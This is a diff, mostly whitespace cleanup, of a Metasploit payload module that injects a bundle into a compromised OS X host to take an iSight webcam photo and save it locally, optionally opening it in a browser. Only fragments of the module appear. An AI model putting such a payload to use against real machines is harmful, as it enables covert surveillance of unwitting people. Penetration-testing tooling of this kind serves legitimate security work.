@@ -3,12 +3,11 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
 ##
-
 
 require 'msf/core'
 require 'msf/core/payload/osx/bundleinject'
@@ -24,6 +23,7 @@ require 'rex/compat'
 module Metasploit3
 
 	include Msf::Payload::Osx::BundleInject
+	include Msf::Sessions::CommandShellOptions
 
 	def initialize(info = {})
 		super(update_info(info,
@@ -37,10 +37,10 @@ module Metasploit3
 		# Override the BUNDLE path with the iSight capture library
 		register_options(
 			[
-				OptPath.new('BUNDLE', 
-					[ 
-						true, 
-						"The local path to the iSight Mach-O Bundle to upload", 
+				OptPath.new('BUNDLE',
+					[
+						true,
+						"The local path to the iSight Mach-O Bundle to upload",
 						File.join(Msf::Config.install_root, "data", "isight.bundle")
 					]),
 				OptBool.new('AUTOVIEW',
@@ -66,8 +66,8 @@ module Metasploit3
 
 		# Create a directory for the images
 		base = File.join(Msf::Config.config_directory, 'logs', 'isight')
-		dest = File.join(base, 
-			host + "_" + Time.now.strftime("%Y%m%d.%M%S")+sprintf("%.5d",rand(100000))+".jpg" 
+		dest = File.join(base,
+			host + "_" + Time.now.strftime("%Y%m%d.%M%S")+sprintf("%.5d",rand(100000))+".jpg"
 		)
 
 		# Create the log directory
@@ -82,7 +82,7 @@ module Metasploit3
 		if (datastore['AUTOVIEW'] == true)
 			print_status("Opening photo in a web browser...")
 			Rex::Compat.open_browser(File.expand_path(dest))
-		end		
+		end
 
 		super(session)
 	end
